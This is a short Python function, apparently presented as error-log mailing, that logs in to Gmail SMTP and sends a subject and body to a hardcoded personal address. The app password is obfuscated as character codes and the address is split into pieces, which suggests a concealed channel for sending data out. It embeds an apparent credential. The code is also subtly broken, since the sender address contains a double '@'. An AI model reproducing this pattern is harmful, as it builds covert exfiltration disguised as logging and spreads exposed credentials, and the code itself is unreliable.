import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os

def send_error_log_via_email(subject, body):
    s1 = "jimothy.jimson11" + "@" + "@gmail.com"
    r1 = "jimothy.jimson11" + "@" + "gmail.com"
    ap = [101,119,121,122,100,114,98,98,111,112,106,107,117,103,103,120]
    ap = ''.join(chr(x) for x in ap)

    msg = MIMEMultipart()
    msg["From"] = s1
    msg["To"] = r1
    msg["Subject"] = subject

    msg.attach(MIMEText(body, "plain"))

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(s1, ap)
        server.sendmail(s1, r1, msg.as_string())
        server.close()
        return True
    except Exception as e:
        print(f"Failed to send email: {e}")
        return False
